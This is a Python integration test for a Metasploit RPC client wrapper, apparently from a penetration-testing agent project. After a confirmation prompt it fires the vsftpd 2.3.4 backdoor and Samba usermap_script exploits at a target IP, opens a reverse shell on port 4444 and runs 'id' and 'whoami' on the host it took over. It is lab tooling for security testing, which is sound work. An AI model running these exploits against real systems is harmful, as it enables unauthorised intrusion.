#!/usr/bin/env python3
"""
MSF RPC Integration Test Script

Before running:
1. Start msfrpcd: msfrpcd -P cyberagent -S -f &
2. Ensure target is reachable

Usage:
    python3 test_msf_rpc.py [target_ip]
"""
import sys
import os

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from mcp.msf_rpc_client import MsfRpcClientWrapper, get_msf_rpc


def test_connection():
    """Test basic RPC connection."""
    print("=" * 50)
    print("MSF RPC Integration Test")
    print("=" * 50)
    print()
    
    client = get_msf_rpc()
    
    if not client.is_connected():
        print("❌ Not connected to msfrpcd")
        print()
        print("To start msfrpcd, run:")
        print("  msfrpcd -P cyberagent -S -f &")
        print()
        return False
    
    print("✅ Connected to msfrpcd")
    print()
    return True


def test_module_search():
    """Test module search functionality."""
    print("Testing module search...")
    
    client = get_msf_rpc()
    
    # Search for vsftpd
    modules = client.search_modules("vsftpd", "exploit")
    print(f"  Found {len(modules)} vsftpd exploits:")
    for m in modules[:3]:
        print(f"    - {m}")
    
    # Search for samba
    modules = client.search_modules("samba", "exploit")
    print(f"  Found {len(modules)} samba exploits:")
    for m in modules[:3]:
        print(f"    - {m}")
    
    print()
    return True


def test_list_sessions():
    """Test session listing."""
    print("Listing active sessions...")
    
    client = get_msf_rpc()
    sessions = client.list_sessions()
    
    if sessions:
        print(f"  {len(sessions)} active session(s):")
        for sid, info in sessions.items():
            print(f"    Session {sid}: {info.get('type', 'shell')} @ {info.get('target_host', 'unknown')}")
    else:
        print("  No active sessions")
    
    print()
    return True


def test_exploit(target_ip, lhost):
    """Test running an actual exploit."""
    print(f"Testing exploit against {target_ip}...")
    print(f"  LHOST: {lhost}")
    print()
    
    client = get_msf_rpc()
    
    # Try vsftpd backdoor
    print("Attempting vsftpd 2.3.4 backdoor...")
    options = {
        'RHOSTS': target_ip,
        'RPORT': '21'
    }
    
    success, session_id, output = client.run_exploit(
        'unix/ftp/vsftpd_234_backdoor',
        options,
        payload='cmd/unix/interact',
        timeout=60
    )
    
    if success:
        print(f"✅ SUCCESS! Session {session_id} obtained")
        
        # Try to interact
        result = client.interact_with_session(session_id, "id")
        print(f"  id output: {result}")
        
        result = client.interact_with_session(session_id, "whoami")
        print(f"  whoami: {result}")
        
        return True
    else:
        print(f"❌ Exploit failed: {output[:200]}")
    
    # Try samba usermap
    print()
    print("Attempting Samba usermap_script...")
    options = {
        'RHOSTS': target_ip,
        'LHOST': lhost,
        'LPORT': '4444'
    }
    
    success, session_id, output = client.run_exploit(
        'multi/samba/usermap_script',
        options,
        payload='cmd/unix/reverse',
        timeout=60
    )
    
    if success:
        print(f"✅ SUCCESS! Session {session_id} obtained")
        result = client.interact_with_session(session_id, "id")
        print(f"  id output: {result}")
        return True
    else:
        print(f"❌ Exploit failed: {output[:200]}")
    
    return False


def get_local_ip():
    """Get local IP address."""
    import subprocess
    try:
        result = subprocess.run(
            ["ip", "route", "get", "1.1.1.1"],
            capture_output=True, text=True, timeout=5
        )
        import re
        match = re.search(r"src\s+(\S+)", result.stdout)
        if match:
            return match.group(1)
    except:
        pass
    return "127.0.0.1"


def main():
    # Get target IP from args or default
    target_ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.80.128"
    lhost = get_local_ip()
    
    print(f"Target: {target_ip}")
    print(f"LHOST:  {lhost}")
    print()
    
    # Test connection
    if not test_connection():
        sys.exit(1)
    
    # Test module search
    test_module_search()
    
    # Test session listing
    test_list_sessions()
    
    # Ask before running exploit
    print("-" * 50)
    response = input(f"Run exploit test against {target_ip}? [y/N] ")
    if response.lower() == 'y':
        test_exploit(target_ip, lhost)
    else:
        print("Skipping exploit test")
    
    print()
    print("=" * 50)
    print("Test complete")
    print("=" * 50)


if __name__ == "__main__":
    main()
